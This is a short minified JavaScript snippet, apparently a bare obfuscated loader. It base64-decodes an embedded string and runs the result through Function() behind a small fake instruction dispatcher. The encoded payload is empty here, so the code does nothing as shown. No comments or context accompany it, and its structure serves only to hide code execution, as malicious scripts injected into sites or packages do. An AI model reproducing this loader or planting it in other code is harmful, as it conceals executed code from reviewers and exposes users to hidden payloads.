(function(){var c='',p=0,b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',s='';for(var i=0;i<c.length;i+=4){var a=b.indexOf(c[i]),d=b.indexOf(c[i+1]),e=b.indexOf(c[i+2]),f=b.indexOf(c[i+3]);s+=String.fromCharCode(a<<2|d>>4);if(e!==64&&e!==-1)s+=String.fromCharCode((d&15)<<4|e>>2);if(f!==64&&f!==-1)s+=String.fromCharCode((e&3)<<6|f);}s=decodeURIComponent(escape(s));var v=[['LOAD',s],['EXEC',0]];while(p<v.length){var x=v[p++];if(x[0]==='LOAD')s=x[1];else if(x[0]==='EXEC')Function(s)();}})();